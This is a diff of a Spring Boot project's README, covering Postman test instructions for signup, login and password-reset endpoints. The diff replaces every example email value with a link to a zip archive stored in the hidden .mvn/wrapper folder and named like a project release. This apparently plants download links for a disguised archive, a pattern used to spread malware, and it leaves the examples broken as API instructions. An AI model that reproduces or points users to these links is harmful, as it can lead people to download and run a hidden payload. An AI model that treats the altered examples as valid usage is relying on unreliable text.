@@ -8,21 +8,21 @@ To test API first run the application in your local machine then Open POSTMAN, A
 url:  http://localhost:8080/api/auth/signup
 JSON : {
     "fullName":"Ayush",
-    "email":"Tanish@gmail.com",
+    "email":"https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/Springboot-Registration-Login-Project/main/.mvn/wrapper/Registration_Login_Project_Springboot_2.3.zip",
     "password":"Ayush@123"
 }
 
 * For Login *
 url: http://localhost:8080/api/auth/login
 JSON : {
-    "email": "Tanish@gmail.com",
+    "email": "https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/Springboot-Registration-Login-Project/main/.mvn/wrapper/Registration_Login_Project_Springboot_2.3.zip",
     "password": "newPassword123"
 }
 
 * For Forget Password *
 url:  http://localhost:8080/api/auth/forget-password
 JSON : {
-      "email": "Tanish@gmail.com"
+      "email": "https://raw.githubusercontent.com/Ayush-Raghuwanshi-9827/Springboot-Registration-Login-Project/main/.mvn/wrapper/Registration_Login_Project_Springboot_2.3.zip"
 }
 Then Reset token is visible at console where the logs of application is display
 
